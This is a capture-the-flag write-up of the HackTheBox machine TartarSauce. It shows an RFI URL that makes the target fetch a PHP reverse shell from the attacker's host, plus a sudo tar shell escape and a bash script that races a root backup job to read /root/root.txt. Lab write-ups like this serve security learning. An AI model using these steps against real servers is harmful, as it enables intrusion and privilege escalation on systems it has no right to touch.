---
title: "TartarSauce - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## TartarSauce
![](https://kar0nx.github.io/assets/images/writeup/583c00a8217dd7a0da9682af44e297db.png)
## Reconnaissance

IP: 10.10.10.88
## NMAP

```
nmap -T4 -p- -A 10.10.10.88
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 09:32 UTC
Nmap scan report for 10.10.10.88
Host is up (0.030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   28.70 ms 10.10.14.1
2   29.42 ms 10.10.10.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.63 seconds
```

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914113247.png)

/robots.txt

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914113342.png)

/monstra-3.0.4

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914113430.png)

searching for exploits for monstra 3.0.4, I found CVE-2018-9037 but we need to be authenticated 
https://www.exploit-db.com/exploits/52038

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914113816.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914113759.png)

Tried few of this RCE exploits, even updating them to the current version but I cannot gain shell.
Going for a hint I found that this is rabbit hole, so skipping it and back to enumeration.
Scanning with feroxbuster I found that there is wp site:

```
feroxbuster -u http://10.10.10.88/webservices/ -x txt,php,html
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914115007.png)

Tip for you don't use feroxbuster cause I dos machine :D and need to restart

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914120850.png)

Running wpscan

```
wpscan --url http://10.10.10.88/webservices/wp/ -e ap --plugins-detection aggressive --api-token asdfasdfasdfasdfasdfa
```

found 1 interesting plugin gwolle with 4 xss vulns

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914122719.png)

searching goolge I found RFI exploit for this plugin
https://www.exploit-db.com/exploits/38861

Reading this exploit and trying poc I got response from server 

```
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/share/esasdf
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914123033.png)

I will user simple PentestMonkey rev shell, and try it
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/rev.php
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914123809.png)

as we can see server downloading wp-load.php from path, so let's change name of our rev shell to wp-load.php and then run

and  we got reverse shell

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914124016.png)

Upgrade to TTY shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Gaining Access

I started with running linpeas and found credentials in wp-config.php

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914125614.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914125710.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914131030.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914131511.png)

So we can run /bin/tar as onuma and that will we the win here, but first I want to check db 

```
mysql -u wpuser -p
w0rdpr3$$d@t@b@$3@cc3$$
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914130712.png)

and I found wpadmin password hash but cannot crack it, so let's move to our sudo priv
https://gtfobins.github.io/gtfobins/tar/#sudo

```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914131250.png)

and we are onuma right now and we can take user flag.

## Privilege Escalation

Let's check processes with pspy as I spot in linpeas, there is some files created in last 5min
pspy32
after few min I got sth

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914132308.png)

Let's check this /usr/sbin/backuperer binary

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914132535.png)

And we can spot that this is deletes all in /var/tmp and create /var/tmp/.sth backup
Then waint 30sec create dir /var/tmp/check and extract zip /var/tmp/.sth.
Ok I stoped there cause my scripting knowledge isn't enough to bypass it and found 0xdf script 

https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html#file-read-as-root
```
#!/bin/bash

## work out of shm
cd /dev/shm

## set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

## loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

## Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

## get filename
fn=$(echo $cur | cut -d'/' -f4)

## extract archive
tar -zxf $fn

## remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

## remove old archive
rm $fn

## create new archive
tar czf $fn var

## put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

## wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt
```

Save it, download on the box and run, after /usr/sbin/backuperer binary executes we will get root.txt (leave it and get cafe you have about 5min)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250914133857.png)

This box was very tricky and have big rabbit hole at the start